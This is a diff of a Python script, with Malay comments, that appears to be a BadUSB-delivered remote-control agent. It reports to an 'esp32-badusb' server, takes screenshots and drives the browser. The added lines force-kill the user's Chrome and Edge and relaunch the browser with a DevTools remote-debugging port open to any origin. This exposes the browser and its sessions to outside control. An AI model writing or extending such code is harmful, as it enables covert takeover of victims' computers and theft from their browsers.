@@ -50,7 +50,7 @@ pyautogui.FAILSAFE = False
 # ============================================================
 # KONFIGURASI
 # ============================================================
-SERVER_URL  = "https://esp32-badusb.onrender.com"
+SERVER_URL = "https://esp32-badusb.onrender.com"
 HEARTBEAT_INTERVAL  = 5.0
 SCREENSHOT_INTERVAL = 3.0
 CDP_PORT     = 9222
@@ -692,6 +692,12 @@ def start_cdp_chrome():
         if not chrome_path:
             print_log("Chrome/Edge not found.")
             return
+            
+        # PAKSA CHROME DITUTUP SUPAYA BOLEH DIBUKA SEMULA DALAM DEBUG MODE
+        subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], capture_output=True)
+        subprocess.run(["taskkill", "/F", "/IM", "msedge.exe"], capture_output=True)
+        time.sleep(1)
+        
         subprocess.Popen(
             [chrome_path, f"--remote-debugging-port={CDP_PORT}", "--remote-allow-origins=*"],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
@@ -716,9 +722,9 @@ def send_cdp_command(method, params=None):
     cdp_msg_id += 1
 
 def initialize_browser_control():
+    # WAJIB LANCARKAN CHROME DEBUG DULU SEBELUM PINCHTAB!
+    start_cdp_chrome()
     download_and_start_pinchtab()
-    if not PINCHTAB_ACTIVE:
-        start_cdp_chrome()
 
 # ============================================================
 # SOCKET.IO EVENT HANDLERS
